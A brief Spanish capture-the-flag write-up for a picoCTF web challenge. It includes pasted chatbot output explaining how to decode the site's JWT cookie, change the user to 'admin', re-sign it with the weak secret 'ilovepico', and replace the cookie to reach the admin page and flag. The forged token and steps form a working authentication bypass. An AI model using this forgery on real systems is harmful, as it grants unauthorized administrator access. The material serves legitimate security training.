## Descripcion
Check the admin scratchpad!

[http://fickle-tempest.picoctf.net:54999](http://fickle-tempest.picoctf.net:54999/)
## Solucion
Se busco la cookie de JTW con F12-Aplications-Cookies y al final seleccionamos la llamada de jtw
Se uso Chatgpt para transformar la cookie a una donde nos de el administrador
Perfecto. **Ese sí es tu JWT real**. Ya podemos ver exactamente qué está pasando.

Tu token está dividido en:

```
HEADER
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9

PAYLOAD
eyJ1c2VyIjoicGVwZSJ9

SIGNATURE
q4oxyL2SNy5WkX0sCJyCSsQFsk-iNmOqHsWEJ24YIw0
```

El payload decodificado es:

```
{
  "user": "pepe"
}
```

Por lo tanto, **no tienes que usar el JSON de John Doe que te mostraba JWT.io**.

### 1. Cambia el payload

En JWT.io cambia:

```
{
  "user": "pepe"
}
```

por:

```
{
  "user": "admin"
}
```

### 2. Firma con la clave

En la parte de **Verify Signature**, selecciona/usa:

```
HMACSHA256
```

y como secret:

```
ilovepico
```

JWT.io debería generarte este token:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```

### 3. Reemplaza la cookie

En F12 → **Application → Cookies**, busca:

```
jwt
```

y reemplaza su valor por:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```

Después **recarga la página**.

Si todo está correcto, el servidor verá:

```
{
  "user": "admin"
}
```

en lugar de:

```
{
  "user": "pepe"
}
```

y debería llevarte al **admin scratchpad**, donde aparecerá el flag.
## Notas adicionales

## Referencias
